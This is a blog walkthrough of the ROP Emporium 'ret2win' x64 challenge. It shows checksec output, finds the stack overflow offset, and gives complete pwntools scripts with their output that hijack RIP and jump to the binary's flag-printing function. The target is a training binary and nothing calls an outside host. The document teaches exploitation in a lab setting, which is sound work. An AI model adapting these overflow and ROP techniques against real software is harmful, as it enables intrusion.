---
layout: single
title:  "ROP Emporium - ret2win (x64)"
date:   2020-10-09
excerpt: "ret2win was a simple challenge from the rop emporium that required the pwner to jump to a flag function, effectively reusing code within the exectuable file at runtime. It introduced the basics of ROP chaining with minimal countermeasures to simplify the process of attacking binaries with a non-executable stack. In this blog post, I break down how I solved this challlenge."
categories:
  - ctf
  - infosec
tags:
  - exploit development
  - defeating non-executable stacks
  - rop chaining
---

## Summary

ret2win was a simple challenge from the rop emporium that required the pwner to jump to a flag function, effectively reusing code within the exectuable file at runtime. It introduced the basics of ROP chaining with minimal countermeasures to simplify the process of attacking binaries with a non-executable stack. In this blog post, I break down how I solved this challlenge.

## Analyze the Countermeasures

Always analyze binary countermeasures because it will determine our objective for exploiting the binary and what the limitations are. For all my binary exploit development walkthroughs, I will be using [pwntools](http://docs.pwntools.com/en/stable/) which when installed comes with `checksec`. This tool analyzes countermeasures in the binary when it was initially compiled: 

```
$ checksec ret2win
[*] '/home/kali/ctf/rop-emporium/ret2win/x64/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

The only countermeasures were `Partial RELRO` and a non-executable stack.
Partial RELRO is the default setting in the `gcc` compiler toolchain and nearly all binaries will have this.
For this excercise, partial RELRO makes no difference other than it forces the GOT to come before the BSS in memory which elimitaes the risk of buffer overflows on a global variable overwriting GOT entries. You can read more on RELRO [here](https://ctf101.org/binary-exploitation/relocation-read-only/).

The meaningful countermeasure in this case is the **non-executable stack** because we won't be able to redirect the program's execution to memory instructions located on the stack.

## Find the Crashing Offset

Ok, let's crash the app so we can find the offset in the stack buffer overflow where we can take control of the RIP register.
We can find the offset by generating [sequential chunks of De Brujin sequences](https://docs.pwntools.com/en/stable/util/cyclic.html) with pwntools' `cyclic()` function.
When the application crashes, the RSP (Stack Pointer) register will return to an offset within our sequence which we can lookup. When the program returns, the RIP register (Instruction Pointer Register) will be set to this value, relinquishing it's execution flow to us.

Once the app crashes, we lookup the value of the RSP register from the core dump and lookup the value with pwntools' `cyclic_find()` function. That will give us the offset from where we can take control of the RIP regsiter:

### exploit.py

```python
from pwn import *

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './ret2win'

# Start the process
io = process(PROCESS)

# Send a cyclic pattern
io.sendline(cyclic(128))

# Wait for the process to crash
io.wait()

# Read the core file
core = io.corefile

# Read the stack pointer at the time of the crash
stack = core.rsp
info("stack: %#x", stack)

# Find the offset for where the binary crashed
pattern = core.read(stack, 4)
offset = cyclic_find(pattern)
info("pattern: %r", pattern)
info("crash offset: %r", offset)
```

```
$ python3 exploit.py
[+] Starting local process './ret2win' argv=[b'./ret2win'] : pid 3849
[DEBUG] Sent 0x81 bytes:
    b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaab\n'
[*] Process './ret2win' stopped with exit code -11 (SIGSEGV) (pid 3849)
[DEBUG] core_pattern: b'core'
[DEBUG] core_uses_pid: False
[DEBUG] interpreter: ''
[DEBUG] Looking for QEMU corefile
[DEBUG] Trying corefile_path: '/home/kali/ctf/rop-emporium/ret2win/x64/qemu_ret2win_*_3849.core'
[DEBUG] Looking for native corefile
[DEBUG] Checking for corefile (pattern)
[DEBUG] Trying corefile_path: '/home/kali/ctf/rop-emporium/ret2win/x64/core'
[+] Parsing corefile...: Done
[*] '/tmp/tmpg2gdkpor'
    Arch:      amd64-64-little
    RIP:       0x400755
    RSP:       0x7ffe4b23fef8
    Exe:       '/home/kali/ctf/rop-emporium/ret2win/x64/ret2win' (0x400000)
    Fault:     0x6161616c6161616b
[+] Parsing corefile...: Done
[*] '/home/kali/ctf/rop-emporium/ret2win/x64/core.3849'
    Arch:      amd64-64-little
    RIP:       0x400755
    RSP:       0x7ffe4b23fef8
    Exe:       '/home/kali/ctf/rop-emporium/ret2win/x64/ret2win' (0x400000)
    Fault:     0x6161616c6161616b
[*] stack: 0x7ffe4b23fef8
[*] pattern: b'kaaa'
[*] crash offset: 40
```

At 40 bytes into the stack buffer overflow, we can set value in the RIP address to an arbitrary value.

## Verify Control Over RIP

Let's verify that we took control over the RIP register by debugging the program in GDB.
In the exploit code below, we can set 40 bytes of padding followed by the 64-bit little-endian value to overwrite the RIP register.
Then, we flish all the program's output buffers so that we know it will be ready to read our payload, and then we send it and wait for the app to crash at 0xdeadbeef.
Please note that I use [gef](https://gef.readthedocs.io/en/master/) to make it easier to analyze stack values while developing binary exploits.

### exploit.py

```python
from pwn import *

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './ret2win'

# Start the process
io = process(PROCESS)

# Attach the debugger for analysis
gdbscript = ""
pid = gdb.attach(io, gdbscript=gdbscript)

# Build the payload
crash_size = 128
offset = 40
padding = b"A" * offset
rip = p64(0xdeadbeef)
remaining = b"B" * (crash_size - len(padding) - len(rip))
payload = b"".join([
   padding,
   rip,
   remaining
])

# Pwn!
io.clean()
io.sendline(payload)
io.wait()
```

```
$ python3 exploit.py
[+] Starting local process './ret2win' argv=[b'./ret2win'] : pid 4603
[*] running in new terminal: /usr/bin/gdb -q  "./ret2win" 4603
[DEBUG] Launching a new terminal: ['/usr/bin/x-terminal-emulator', '-e', '/usr/bin/gdb -q  "./ret2win" 4603']
[+] Waiting for debugger: Done
[DEBUG] Received 0x100 bytes:
    b'ret2win by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!\n'
    b'What could possibly go wrong?\n'
    b"You there, may I have your input please? And don't worry about null bytes, we're using read()!\n"
    b'\n'
    b'> '
[DEBUG] Sent 0x81 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  ef be ad de  00 00 00 00  │AAAA│AAAA│····│····│
    00000030  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
    *
    00000080  0a                                                  │·│
    00000081

```

```
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0xdeadbeef
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win", stopped 0xdeadbeef in ?? (), reason: SIGSEGV
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  
```

Notice that we have successfully redirected execution of RIP to `0xdeadbeef`.

## Capturing the Flag

In real-life, our top priority should be to get a shell so that we can execute commands interactively on behalf of the binary.
However, since this is a CTF challenge, we only care about capturing the flag.
We can use `radare2` to check if the binary executes any system commands.

First, we need to analyze the binary:

```
$ r2 ret2win
[0x004005b0]> aaa
[x] Analyze all flags starting with sym. and entry0 (aa)
[x] Analyze function calls (aac)
[x] Analyze len bytes of instructions for references (aar)
[x] Check for objc references
[x] Check for vtables
[x] Type matching analysis for all functions (aaft)
[x] Propagate noreturn information
[x] Use -AA or aaaa to perform additional experimental analysis.
```

Next, we can search for all functions exported by the ELF:

```
[0x004005b0]> afl
0x004005b0    1 42           entry0
0x004005f0    4 42   -> 37   sym.deregister_tm_clones
0x00400620    4 58   -> 55   sym.register_tm_clones
0x00400660    3 34   -> 29   entry.fini0
0x00400690    1 7            entry.init0
0x004006e8    1 110          sym.pwnme
0x00400580    1 6            sym.imp.memset
0x00400550    1 6            sym.imp.puts
0x00400570    1 6            sym.imp.printf
0x00400590    1 6            sym.imp.read
0x00400756    1 27           sym.ret2win
0x00400560    1 6            sym.imp.system
0x004007f0    1 2            sym.__libc_csu_fini
0x004007f4    1 9            sym._fini
0x00400780    4 101          sym.__libc_csu_init
0x004005e0    1 2            sym._dl_relocate_static_pie
0x00400697    1 81           main
0x004005a0    1 6            sym.imp.setvbuf
0x00400528    3 23           sym._init
```

Looking at the ELF's `ret2win()` function, we can see that it is sufficient for dumping the flag and solving the challenge:

```
[0x004005b0]> pdf @sym.ret2win
┌ 27: sym.ret2win ();
│           0x00400756      55             push rbp
│           0x00400757      4889e5         mov rbp, rsp
│           0x0040075a      bf26094000     mov edi, str.Well_done__Here_s_your_flag: ; 0x400926 ; "Well done! Here's your flag:" ; const char *s
│           0x0040075f      e8ecfdffff     call sym.imp.puts           ; int puts(const char *s)
│           0x00400764      bf43094000     mov edi, str.bin_cat_flag.txt ; 0x400943 ; "/bin/cat flag.txt" ; const char *string
│           0x00400769      e8f2fdffff     call sym.imp.system         ; int system(const char *string)
│           0x0040076e      90             nop
│           0x0040076f      5d             pop rbp
└           0x00400770      c3             ret
```

At this point, the challenge was nice enough to dump the flag by simply jumping to the `ret2win()` function as it invokes `system("/bin/cat flag.txt")`, so let's update the code to do that.

In the code below, I leveraged `pwntools` ROP wrapper which we will use in future binary exploitation challenges. The example below doesn't really chain anything since the only function invoked is `ret2win()`. However, its good to be familiar with this foundation.

In short, we will redirect the RIP register to point to the memory address of the `ret2win()` function which will capture the flag for us:

```python
from pwn import *

# Set the pwntools context
context.arch = 'amd64'
context.log_level = 'debug'

# Project constants
PROCESS = './ret2win'

# Start the process
io = process(PROCESS)

rop = ROP(io.elf)
ret2win = p64(io.elf.symbols['ret2win'])
rop.raw(ret2win)
info(rop.dump())

# Build the payload
crash_size = 128
offset = 40
padding = b"A" * offset
rop_chain = rop.chain()
remaining = b"B" * (crash_size - len(padding) - len(rop_chain))
payload = b"".join([
   padding,
   rop_chain,
   remaining
])

# Pwn!
io.clean()
io.sendline(payload)
io.clean()
io.wait()
```

```
$ python3 exploit.py
[+] Starting local process './ret2win' argv=[b'./ret2win'] : pid 4895
[DEBUG] PLT 0x400550 puts
[DEBUG] PLT 0x400560 system
[DEBUG] PLT 0x400570 printf
[DEBUG] PLT 0x400580 memset
[DEBUG] PLT 0x400590 read
[DEBUG] PLT 0x4005a0 setvbuf
[*] '/home/kali/ctf/rop-emporium/ret2win/x64/ret2win'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './ret2win'
[DEBUG] PLT 0x400550 puts
[DEBUG] PLT 0x400560 system
[DEBUG] PLT 0x400570 printf
[DEBUG] PLT 0x400580 memset
[DEBUG] PLT 0x400590 read
[DEBUG] PLT 0x4005a0 setvbuf
[*] 0x0000: b'V\x07@\x00\x00\x00\x00\x00' b'V\x07@\x00\x00\x00\x00\x00'
[DEBUG] Received 0x100 bytes:
    b'ret2win by ROP Emporium\n'
    b'x86_64\n'
    b'\n'
    b'For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!\n'
    b'What could possibly go wrong?\n'
    b"You there, may I have your input please? And don't worry about null bytes, we're using read()!\n"
    b'\n'
    b'> '
[DEBUG] Sent 0x81 bytes:
    00000000  41 41 41 41  41 41 41 41  41 41 41 41  41 41 41 41  │AAAA│AAAA│AAAA│AAAA│
    *
    00000020  41 41 41 41  41 41 41 41  56 07 40 00  00 00 00 00  │AAAA│AAAA│V·@·│····│
    00000030  42 42 42 42  42 42 42 42  42 42 42 42  42 42 42 42  │BBBB│BBBB│BBBB│BBBB│
    *
    00000080  0a                                                  │·│
    00000081
[DEBUG] Received 0x28 bytes:
    b'Thank you!\n'
    b"Well done! Here's your flag:\n"
[DEBUG] Received 0x21 bytes:
    b'ROPE{a_placeholder_32byte_flag!}\n'
[*] Process './ret2win' stopped with exit code -11 (SIGSEGV) (pid 4895)
```

The contents of the flag were: `ROPE{a_placeholder_32byte_flag!}`.

The important lesson learned here is that the memory address in the RIP register didn't execute any instructions on the stack!
However, we ended up reusing code that already existed in the executable itself to capture the flag!

One last thing to notice is that the process crashed. This is because the stack didn't unwind properly and returned to a bogus address.
In practice, we normally want the process to exit gracefully by returning to the `exit()` or continue execution by jumping to the `main()` function.
We will see in future challenges how we can use gradually build upon what we learned in this basic challenge.
